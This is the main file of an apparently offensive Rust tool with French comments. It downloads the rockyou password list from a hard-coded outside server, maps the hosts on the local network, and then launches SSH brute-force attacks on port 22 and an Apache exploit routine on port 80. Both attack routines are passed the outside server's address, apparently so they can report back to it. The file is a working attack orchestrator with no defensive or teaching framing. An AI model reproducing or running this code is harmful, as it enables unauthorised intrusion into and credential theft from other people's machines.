mod ssh;
mod utils;
mod web;


use std::thread;
use futures::future::join_all;
use tokio::runtime::Runtime;



#[tokio::main]
async fn main() {
    //let ip_target = "192.168.1.47"; // en cas de test spécifique
    let ip_srv = "51.77.193.65";
    let port_srv = "8080";

    utils::get_rockyou(ip_srv, port_srv).await.expect("error : dl rockyou");

    // Crée un runtime tokio
    let rt = Runtime::new().unwrap();

    // Utilise le runtime tokio pour exécuter du code async dans un thread
    let handle = thread::spawn(move || {
        rt.block_on(async {
            match utils::get_parc_ip().await {
                Ok(ips_ports) => {

                    println!("[x] - Début des attaques ...");
                    println!("______________________");
                    let mut tasks = vec![];

                    for ip in ips_ports.keys() {

                        let ports = ips_ports.get(ip).unwrap();

                        for port in ports {

                            if port == &22 {
                                let ip_clone = ip.clone();
                                let task = tokio::spawn(async move {
                                    ssh::ssh_bruteforce(&ip_clone, "bibli/", ip_srv, port_srv).await;
                                });
                                tasks.push(task);
                            }

                            if port == &80 {
                                let ip_clone = ip.clone();
                                let task = tokio::spawn(async move {
                                    web::exploit_apache(&ip_clone,ip_srv,port_srv).await;
                                });
                                tasks.push(task);
                            }

                        }
                    }

                    // Attendre que toutes les tâches se terminent
                    join_all(tasks).await;
                },
                Err(e) => {
                    eprintln!("Error: {}", e);
                }
            }
        });
    });

    handle.join().unwrap();
    println!("Toutes les tâches sont terminées.");



}



